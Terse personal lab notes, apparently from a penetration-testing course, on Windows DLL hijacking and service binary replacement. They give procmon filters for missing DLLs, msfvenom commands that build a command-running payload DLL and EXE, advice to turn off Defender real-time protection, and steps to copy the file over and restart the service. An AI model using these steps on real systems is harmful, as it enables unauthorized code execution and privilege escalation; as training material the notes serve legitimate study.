DLL Hijacking
have procmon open and capturing
  filter for 
    process name is/contains <name of application you want> (putty.exe)
    result contains/is NAME NOT FOUND
    path contains .dll
  pick one of them (preferably one in the same directory as your application, just work your way down the dll search order)
  msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\Users\<your user>\Desktop\whoami.txt' -f dll > <name of the dll you're replacing> SSPICLI.dll
    don't have to do that, you can use multi/handler steps as long as you open up the multi/handler on msfconsole and follow those steps OR just run other commands
     you can then scp the file from your linops to the box you want it on (when doing scp it's easier to just mv it to ~ first
       you can also use scp  from powershell/cmd on the windows box you want it on
   make sure real time protection is off for windows defender  so it doesn't catch it
   run the application
    whoami.txt pulls uup on your desktop

go to services
find one to hijack
  if the admin is lazy ty and find one wiht no description that isn't legitimate
go to location of that one
see if you can write to that directory
  try and create a notepad file or try and change the name of what's already there
msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\Users\<your user>\Desktop\whoami.txt' -f exe > <name of the dll you're replacing> 7z.exe
scp it over
  scp student@10.50.45.180:7z.exe .
restart the service or the box 
  normally the box since you probably don't have permissions to restart the service
